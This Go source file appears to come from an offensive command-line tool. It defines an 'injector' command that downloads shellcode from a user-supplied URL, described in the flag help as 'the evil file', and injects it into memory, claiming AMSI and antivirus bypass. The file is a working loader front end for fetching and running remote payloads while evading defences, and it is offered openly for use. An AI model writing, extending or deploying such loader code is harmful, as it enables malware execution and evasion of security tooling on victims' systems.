/*
Copyright © 2021 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"github.com/RachidMoysePolania/ShellCodeInjector"
	"github.com/spf13/cobra"
)

var urlv string

// injectorCmd represents the injector command
var injectorCmd = &cobra.Command{
	Use:   "injector",
	Short: "Inject your shellcode into memory",
	Long:  `Inject your shellcode into memory with AMSI/AV bypass techniques`,
	Run: func(cmd *cobra.Command, args []string) {
		shellcode, err := ShellCodeInjector.GetShellCodeFromUrl(urlv)
		ShellCodeInjector.HandleError(err)
		ShellCodeInjector.InjectMemory(shellcode)
	},
}

func init() {
	rootCmd.AddCommand(injectorCmd)
	injectorCmd.Flags().StringVarP(&urlv, "url", "u", "", "The full url to the evil file")

}
